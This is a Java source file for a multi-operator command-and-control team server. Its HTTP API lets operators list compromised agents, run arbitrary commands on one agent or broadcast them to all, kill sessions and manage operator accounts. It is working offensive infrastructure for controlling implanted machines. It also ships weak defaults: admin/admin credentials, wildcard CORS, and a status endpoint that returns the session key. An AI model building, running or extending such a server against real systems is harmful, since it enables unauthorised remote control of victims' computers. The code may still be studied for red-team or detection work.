package com.tomcat.iface;

import com.google.gson.Gson;
import com.sun.net.httpserver.*;
import com.tomcat.core.db.TeamDatabase;
import com.tomcat.core.db.TeamDatabase.OperatorRole;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.ListenerMode;
import com.tomcat.core.server.TomcatServer;
import com.tomcat.core.session.Session;
import com.tomcat.utils.ServerConfig;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

/**
 * TeamServer — multi-operator C2 management server.
 *
 * Runs its own HTTP API on teamserver.port (default 5001).
 * The C2 listener runs separately on server.port.
 *
 * Authentication:
 *   POST /api/auth/login    { "Username": "...", "Password": "..." }
 *   → { "Token": "...", "Role": "ADMIN|OPERATOR|VIEWER" }
 *
 * All other /api/* endpoints require:
 *   Header: Authorization: Bearer <token>
 *
 * Operator access levels:
 *   ADMIN    → all operations including operator management
 *   OPERATOR → execute commands, view sessions, broadcast
 *   VIEWER   → read-only: sessions, logs, history
 */
public final class TeamServer {

    private final ServerConfig Config;
    private final ListenerMode Mode;
    private final TeamDatabase Db;
    private TomcatServer Server;
    private HttpServer HttpSrv;
    private Instant ServerStartTime;

    private final List<String> Logs = new CopyOnWriteArrayList<>();
    private final ConcurrentHashMap<String, Session> Sessions = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, TokenInfo> Tokens = new ConcurrentHashMap<>();
    private final Gson GsonInst = new Gson();
    private final int MaxLogs;

    private static final long TokenTtlMs = 8 * 60 * 60 * 1000L;

    private record TokenInfo(String Username, OperatorRole Role, long ExpiresAt) {
        boolean IsValid() {
            return System.currentTimeMillis() < ExpiresAt;
        }
    }

    public TeamServer(ServerConfig Config, ListenerMode Mode) {
        this.Config = Config;
        this.Mode = Mode;
        this.MaxLogs = Config.GetMaxLogEntries();
        this.Db = TeamDatabase.Connect(Config);
    }

    public void Run(String Host, int Port) throws Exception {
        HttpSrv = HttpServer.create(new InetSocketAddress(Host, Port), 100);
        SetupRoutes();
        HttpSrv.setExecutor(Executors.newFixedThreadPool(20));
        HttpSrv.start();
        Logger.Info("TeamServer started on http://" + Host + ":" + Port);
        Logger.Info("Default credentials: admin / admin  (change immediately)");
        AddLog("TeamServer initialized — mode=" + Mode.name());
    }

    private void SetupRoutes() {
        HttpSrv.createContext("/api/auth/login", Ex -> Handle(Ex, this::AuthLogin, false));
        HttpSrv.createContext("/api/auth/logout", Ex -> Handle(Ex, this::AuthLogout, true));
        HttpSrv.createContext("/api/server/status", Ex -> Handle(Ex, this::ApiStatus, true));
        HttpSrv.createContext("/api/server/start", Ex -> Handle(Ex, this::ApiStart, true));
        HttpSrv.createContext("/api/server/stop", Ex -> Handle(Ex, this::ApiStop, true));
        HttpSrv.createContext("/api/agents", Ex -> Handle(Ex, this::ApiAgents, true));
        HttpSrv.createContext("/api/command/execute", Ex -> Handle(Ex, this::ApiExecute, true));
        HttpSrv.createContext("/api/command/broadcast", Ex -> Handle(Ex, this::ApiBroadcast, true));
        HttpSrv.createContext("/api/command/broadcastall", Ex -> Handle(Ex, this::ApiBroadcastAll, true));
        HttpSrv.createContext("/api/command/history", Ex -> Handle(Ex, this::ApiHistory, true));
        HttpSrv.createContext("/api/sessions/history", Ex -> Handle(Ex, this::ApiSessionHist, true));
        HttpSrv.createContext("/api/agents/kill", Ex -> Handle(Ex, this::ApiKill, true));
        HttpSrv.createContext("/api/agents/note", Ex -> Handle(Ex, this::ApiNote, true));
        HttpSrv.createContext("/api/logs", Ex -> Handle(Ex, this::ApiLogs, true));
        HttpSrv.createContext("/api/team/operators", Ex -> Handle(Ex, this::ApiOperators, true));
        HttpSrv.createContext("/api/team/operators/create", Ex -> Handle(Ex, this::ApiOpCreate, true));
        HttpSrv.createContext("/api/team/operators/role", Ex -> Handle(Ex, this::ApiOpRole, true));
        HttpSrv.createContext("/api/team/operators/delete", Ex -> Handle(Ex, this::ApiOpDelete, true));
    }

    @FunctionalInterface
    interface RouteHandler {
        String Handle(HttpExchange E, TokenInfo Token) throws Exception;
    }

    private void Handle(HttpExchange E, RouteHandler H, boolean RequireAuth) {
        try {
            E.getResponseHeaders().add("Content-Type", "application/json");
            E.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
            E.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
            E.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type,Authorization");
            if (E.getRequestMethod().equalsIgnoreCase("OPTIONS")) {
                E.sendResponseHeaders(200, -1);
                return;
            }

            TokenInfo Token = null;
            if (RequireAuth) {
                String Auth = E.getRequestHeaders().getFirst("Authorization");
                if (Auth == null || !Auth.startsWith("Bearer ")) {
                    Reply(E, 401, Map.of("Error", "Missing authorization token"));
                    return;
                }
                Token = Tokens.get(Auth.substring(7));
                if (Token == null || !Token.IsValid()) {
                    Reply(E, 401, Map.of("Error", "Invalid or expired token"));
                    return;
                }
            }

            String Body = H.Handle(E, Token);
            byte[] Bytes = Body.getBytes("UTF-8");
            E.sendResponseHeaders(200, Bytes.length);
            try (OutputStream Os = E.getResponseBody()) {
                Os.write(Bytes);
            }
        } catch (Exception Ex) {
            try {
                byte[] Bytes = GsonInst.toJson(Map.of("Error", Ex.getMessage())).getBytes("UTF-8");
                E.sendResponseHeaders(500, Bytes.length);
                try (OutputStream Os = E.getResponseBody()) {
                    Os.write(Bytes);
                }
            } catch (IOException Ignored) {}
        }
    }

    private void Reply(HttpExchange E, int Status, Object Body) throws IOException {
        byte[] Bytes = GsonInst.toJson(Body).getBytes("UTF-8");
        E.sendResponseHeaders(Status, Bytes.length);
        try (OutputStream Os = E.getResponseBody()) {
            Os.write(Bytes);
        }
    }

    private String AuthLogin(HttpExchange E, TokenInfo Ignored) throws Exception {
        Map<String, Object> Body = ParseBody(E);
        String Username = str(Body, "Username", "");
        String Password = str(Body, "Password", "");
        if (Username.isEmpty() || Password.isEmpty()) return GsonInst.toJson(
            Map.of("Error", "Username and Password required")
        );
        String Hash = TeamDatabase.HashPassword(Password);
        if (!Db.ValidateOperator(Username, Hash)) return GsonInst.toJson(Map.of("Error", "Invalid credentials"));
        OperatorRole Role = Db.GetOperatorRole(Username);
        String Token = GenerateToken();
        Tokens.put(Token, new TokenInfo(Username, Role, System.currentTimeMillis() + TokenTtlMs));
        Logger.Info("Operator logged in: " + Username + " [" + Role + "]");
        AddLog("[AUTH] Login: " + Username + " [" + Role + "]");
        return GsonInst.toJson(
            Map.of("Token", Token, "Role", Role.name(), "Username", Username, "ExpiresIn", TokenTtlMs / 1000)
        );
    }

    private String AuthLogout(HttpExchange E, TokenInfo Token) throws Exception {
        String Auth = E.getRequestHeaders().getFirst("Authorization");
        if (Auth != null && Auth.startsWith("Bearer ")) Tokens.remove(Auth.substring(7));
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiStatus(HttpExchange E, TokenInfo Token) {
        boolean Running = Server != null && Server.IsRunning();
        Map<String, Object> R = new LinkedHashMap<>();
        R.put("Status", Running ? "Online" : "Offline");
        R.put("Mode", Mode.name());
        R.put("Host", Running ? Server.GetHost() : Config.GetServerHost());
        R.put("Port", Running ? Server.GetPort() : Config.GetServerPort());
        R.put("Agents", Running ? Server.GetSessions().Count() : 0);
        R.put("Uptime", GetUptime());
        R.put("Operator", Token.Username());
        R.put("Role", Token.Role().name());
        R.put("DbType", Config.GetDbType());
        R.put("DbOnline", Db.IsConnected());
        if (Running) R.put("Key", Server.GetCrypto().GetKeyAsBase64Url());
        return GsonInst.toJson(R);
    }

    private String ApiStart(HttpExchange E, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) return GsonInst.toJson(Map.of("Error", "ADMIN role required"));
        if (Server != null && Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server already running"));
        Map<String, Object> Body = ParseBody(E);
        String Host = str(Body, "Host", Config.GetServerHost());
        int Port = intVal(Body, "Port", Config.GetServerPort());
        Server = new TomcatServer(Host, Port, Mode, Config);
        Server.AddEventListener(this::OnEvent);
        boolean[] Result = Server.StartServer();
        if (!Result[0]) {
            AddLog("[!] Failed to start server");
            return GsonInst.toJson(Map.of("Error", "Failed to start server"));
        }
        ServerStartTime = Instant.now();
        new Thread(Server::AcceptConnections, "AcceptConnections").start();
        AddLog("[+] Server started on " + Host + ":" + Port + " by " + Token.Username());
        return GsonInst.toJson(Map.of("Success", true, "Host", Host, "Port", Port));
    }

    private String ApiStop(HttpExchange E, TokenInfo Token) {
        if (!Token.Role().CanManage()) return GsonInst.toJson(Map.of("Error", "ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Server.StopServer();
        Server = null;
        ServerStartTime = null;
        AddLog("[!] Server stopped by " + Token.Username());
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiAgents(HttpExchange E, TokenInfo Token) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        for (Session S : Server.GetSessions().GetAll()) {
            Map<String, Object> A = new LinkedHashMap<>();
            A.put("ID", S.GetId());
            A.put("Hostname", S.GetHostname());
            A.put("OS", S.GetOs());
            A.put("User", S.GetUser());
            A.put("Arch", S.GetArch());
            A.put("AgentIP", S.GetAgentIp());
            A.put("AgentName", S.GetAgentName());
            A.put("JoinedAt", S.GetJoinedAt());
            A.put("Type", S.GetSessionType().name());
            A.put("ShellMode", S.GetShellMode());
            A.put("Encrypted", S.IsEncrypted());
            A.put("MtlsEnabled", S.IsMtlsEnabled());
            A.put("Note", Db.GetAgentNote(S.GetId()));
            Agents.add(A);
        }
        return GsonInst.toJson(Map.of("Agents", Agents));
    }

    private String ApiExecute(HttpExchange E, TokenInfo Token) throws Exception {
        if (!Token.Role().CanExecute()) return GsonInst.toJson(Map.of("Error", "OPERATOR or ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> Body = ParseBody(E);
        int AgentId = intVal(Body, "AgentId", 0);
        String Command = str(Body, "Command", "");
        if (AgentId == 0 || Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "AgentId and Command required"));
        AddLog("[>] [" + Token.Username() + "] Agent-" + AgentId + " » " + Command);
        String[] Result = Server.ExecuteCommand(AgentId, Command);
        boolean Ok = Boolean.parseBoolean(Result[0]);
        Db.SaveCommandLog(AgentId, Token.Username(), Command, Result[1], Ok);
        AddLog(Ok ? "[+] " + Result[1] : "[!] " + Result[1]);
        return GsonInst.toJson(Map.of("Success", Ok, "Output", Result[1], "Command", Command));
    }

    private String ApiBroadcast(HttpExchange E, TokenInfo Token) throws Exception {
        if (!Token.Role().CanBroadcast()) return GsonInst.toJson(Map.of("Error", "OPERATOR or ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> Body = ParseBody(E);
        String Command = str(Body, "Command", "");
        @SuppressWarnings("unchecked")
        List<Object> RawIds = (List<Object>) Body.getOrDefault("AgentIds", new ArrayList<>());
        if (Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "Command required"));
        List<Integer> Ids = new ArrayList<>();
        for (Object O : RawIds) {
            try {
                Ids.add((int) Double.parseDouble(O.toString()));
            } catch (Exception Ignored) {}
        }
        if (Ids.isEmpty()) return GsonInst.toJson(Map.of("Error", "AgentIds required"));
        AddLog("[BROADCAST] [" + Token.Username() + "] → " + Ids.size() + " agents » " + Command);
        Map<Integer, String[]> Results = Server.BroadcastCommand(Ids, Command);
        Map<String, Object> Out = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            Out.put(
                String.valueOf(En.getKey()),
                Map.of("Success", Boolean.parseBoolean(En.getValue()[0]), "Output", En.getValue()[1])
            );
            Db.SaveCommandLog(
                En.getKey(),
                Token.Username(),
                Command,
                En.getValue()[1],
                Boolean.parseBoolean(En.getValue()[0])
            );
        }
        return GsonInst.toJson(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }

    private String ApiBroadcastAll(HttpExchange E, TokenInfo Token) throws Exception {
        if (!Token.Role().CanBroadcast()) return GsonInst.toJson(Map.of("Error", "OPERATOR or ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> Body = ParseBody(E);
        String Command = str(Body, "Command", "");
        if (Command.isEmpty()) return GsonInst.toJson(Map.of("Error", "Command required"));
        AddLog("[BROADCAST-ALL] [" + Token.Username() + "] → " + Server.GetSessions().Count() + " agents » " + Command);
        Map<Integer, String[]> Results = Server.BroadcastAll(Command);
        Map<String, Object> Out = new LinkedHashMap<>();
        for (Map.Entry<Integer, String[]> En : Results.entrySet()) {
            Out.put(
                String.valueOf(En.getKey()),
                Map.of("Success", Boolean.parseBoolean(En.getValue()[0]), "Output", En.getValue()[1])
            );
            Db.SaveCommandLog(
                En.getKey(),
                Token.Username(),
                Command,
                En.getValue()[1],
                Boolean.parseBoolean(En.getValue()[0])
            );
        }
        return GsonInst.toJson(Map.of("Success", true, "Results", Out, "Count", Results.size()));
    }

    private String ApiHistory(HttpExchange E, TokenInfo Token) throws Exception {
        Map<String, Object> Body = ParseBody(E);
        int AgentId = intVal(Body, "AgentId", 0);
        int Limit = intVal(Body, "Limit", 100);
        return GsonInst.toJson(Map.of("History", Db.GetCommandHistory(AgentId, Limit)));
    }

    private String ApiSessionHist(HttpExchange E, TokenInfo Token) throws Exception {
        Map<String, Object> Body = ParseBody(E);
        int Limit = intVal(Body, "Limit", 100);
        return GsonInst.toJson(Map.of("Sessions", Db.GetSessionHistory(Limit)));
    }

    private String ApiKill(HttpExchange E, TokenInfo Token) throws Exception {
        if (!Token.Role().CanKill()) return GsonInst.toJson(Map.of("Error", "ADMIN role required"));
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Error", "Server not running"));
        Map<String, Object> Body = ParseBody(E);
        int AgentId = intVal(Body, "AgentId", 0);
        if (AgentId == 0) return GsonInst.toJson(Map.of("Error", "AgentId required"));
        Server.RemoveSession(AgentId);
        AddLog("[KILL] [" + Token.Username() + "] Agent-" + AgentId);
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiNote(HttpExchange E, TokenInfo Token) throws Exception {
        Map<String, Object> Body = ParseBody(E);
        int AgentId = intVal(Body, "AgentId", 0);
        String Note = str(Body, "Note", "");
        Db.SetAgentNote(AgentId, Note);
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiLogs(HttpExchange E, TokenInfo Token) {
        return GsonInst.toJson(Map.of("Logs", new ArrayList<>(Logs)));
    }

    private String ApiOperators(HttpExchange E, TokenInfo Token) {
        if (!Token.Role().CanManage()) return GsonInst.toJson(Map.of("Error", "ADMIN role required"));
        return GsonInst.toJson(Map.of("Operators", Db.GetOperators()));
    }

    private String ApiOpCreate(HttpExchange E, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) return GsonInst.toJson(Map.of("Error", "ADMIN role required"));
        Map<String, Object> Body = ParseBody(E);
        String Username = str(Body, "Username", "");
        String Password = str(Body, "Password", "");
        String RoleStr = str(Body, "Role", "OPERATOR");
        if (Username.isEmpty() || Password.isEmpty()) return GsonInst.toJson(
            Map.of("Error", "Username and Password required")
        );
        if (Password.length() < 8) return GsonInst.toJson(Map.of("Error", "Password must be at least 8 characters"));
        OperatorRole Role = OperatorRole.FromString(RoleStr);
        boolean Created = Db.CreateOperator(Username, TeamDatabase.HashPassword(Password), Role);
        if (!Created) return GsonInst.toJson(Map.of("Error", "Username already exists"));
        AddLog("[TEAM] [" + Token.Username() + "] Created operator: " + Username + " [" + Role + "]");
        return GsonInst.toJson(Map.of("Success", true, "Username", Username, "Role", Role.name()));
    }

    private String ApiOpRole(HttpExchange E, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) return GsonInst.toJson(Map.of("Error", "ADMIN role required"));
        Map<String, Object> Body = ParseBody(E);
        String Username = str(Body, "Username", "");
        String RoleStr = str(Body, "Role", "");
        if (Username.isEmpty() || RoleStr.isEmpty()) return GsonInst.toJson(
            Map.of("Error", "Username and Role required")
        );
        if (Username.equals("admin")) return GsonInst.toJson(Map.of("Error", "Cannot change admin role"));
        OperatorRole Role = OperatorRole.FromString(RoleStr);
        Db.UpdateOperatorRole(Username, Role);
        AddLog("[TEAM] [" + Token.Username() + "] Updated role: " + Username + " → " + Role);
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiOpDelete(HttpExchange E, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) return GsonInst.toJson(Map.of("Error", "ADMIN role required"));
        Map<String, Object> Body = ParseBody(E);
        String Username = str(Body, "Username", "");
        if (Username.isEmpty()) return GsonInst.toJson(Map.of("Error", "Username required"));
        if (Username.equals("admin")) return GsonInst.toJson(Map.of("Error", "Cannot delete admin"));
        boolean Deleted = Db.DeleteOperator(Username);
        if (Deleted) AddLog("[TEAM] [" + Token.Username() + "] Deleted operator: " + Username);
        return GsonInst.toJson(Map.of("Success", Deleted));
    }

    private void OnEvent(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case AgentConnected -> {
                AddLog(
                    "[+] Session-" +
                    Data.get("ID") +
                    " [" +
                    Data.get("Type") +
                    "] " +
                    Data.get("User") +
                    "@" +
                    Data.get("Hostname") +
                    " " +
                    Data.get("OS")
                );
                Db.SaveSessionEvent(Data, "connected");
            }
            case AgentDisconnected -> {
                AddLog("[!] Session-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
                Db.SaveSessionEvent(Data, "disconnected");
            }
            case Error -> AddLog("[!] " + Data.get("Message"));
        }
    }

    private void AddLog(String Msg) {
        String Entry = "[" + LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + "] " + Msg;
        Logs.add(Entry);
        if (Logs.size() > MaxLogs) Logs.remove(0);
        Db.SaveLog(Entry);
    }

    private String GetUptime() {
        if (ServerStartTime == null) return "00:00:00";
        long S = Duration.between(ServerStartTime, Instant.now()).getSeconds();
        return String.format("%02d:%02d:%02d", S / 3600, (S % 3600) / 60, S % 60);
    }

    private String GenerateToken() {
        byte[] B = new byte[32];
        new java.security.SecureRandom().nextBytes(B);
        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(B);
    }

    private Map<String, Object> ParseBody(HttpExchange E) throws Exception {
        try (InputStream Is = E.getRequestBody()) {
            String Body = new String(Is.readAllBytes(), "UTF-8");
            if (Body.isEmpty()) return new HashMap<>();
            return GsonInst.fromJson(Body, Map.class);
        }
    }

    private static String str(Map<String, Object> M, String K, String Def) {
        Object V = M.get(K);
        return V != null ? V.toString() : Def;
    }

    private static int intVal(Map<String, Object> M, String K, int Def) {
        try {
            return (int) Double.parseDouble(M.getOrDefault(K, Def).toString());
        } catch (Exception E) {
            return Def;
        }
    }

    public void Stop() {
        if (Server != null) Server.StopServer();
        if (HttpSrv != null) HttpSrv.stop(0);
        Db.Close();
    }
}
